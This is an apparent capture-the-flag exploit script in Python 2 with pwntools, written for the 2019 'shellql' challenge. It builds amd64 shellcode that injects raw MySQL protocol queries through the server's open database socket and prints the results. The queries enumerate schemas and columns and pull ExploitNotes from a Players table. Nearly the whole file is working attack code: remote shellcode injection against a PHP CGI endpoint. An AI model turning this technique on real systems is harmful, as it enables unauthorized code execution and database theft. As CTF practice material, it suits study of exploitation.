#!/usr/bin/env python2
from pwn import *
import requests
import re
import sys

context.arch = "amd64"
context.os = "linux"

host = "http://shellretql.quals2019.oooverflow.io:9090/"
html = """X-Powered-By: PHP/7.0.28-0ubuntu0.16.04.1\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n<html><body>Hello World!</body></html>"""

def query(q):
    delimeter = 'scc'
    _query = "select '%s',(%s),'%s';" % (delimeter, q, delimeter[::-1])

    shellcode = ""
    shellcode += shellcraft.echo(p16(len(_query)) + "\x00\x00\x03" + _query , 4)
    shellcode += shellcraft.read(4, 'rsp', 200)
    shellcode += shellcraft.pushstr(html)
    shellcode += shellcraft.write(1, 'rsp', 500)

    data = {
      "shell": asm(shellcode) + "\x00"
    }

    resp = requests.post(host + "/cgi-bin/index.php", data=data)
    data = resp.text.split(delimeter)
    data = [x.split(delimeter[::-1])[0] for x in data]

    for match in data:
        if not 'Hello World' in match and len(match) < 100:
            sys.stdout.write(match)
            sys.stdout.write('\n')
            sys.stdout.flush()


#for i in xrange(100):
#    q = 'SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET %i' % i
#    query(q)

#for i in xrange(600,1100):
#    q = 'SELECT column_name FROM information_schema.columns LIMIT 1 OFFSET %i' % i
#    query(q)

for i in xrange(100):
    q = 'SELECT ExploitNotes FROM shellql.Players LIMIT 1 OFFSET %i' % i
    query(q)
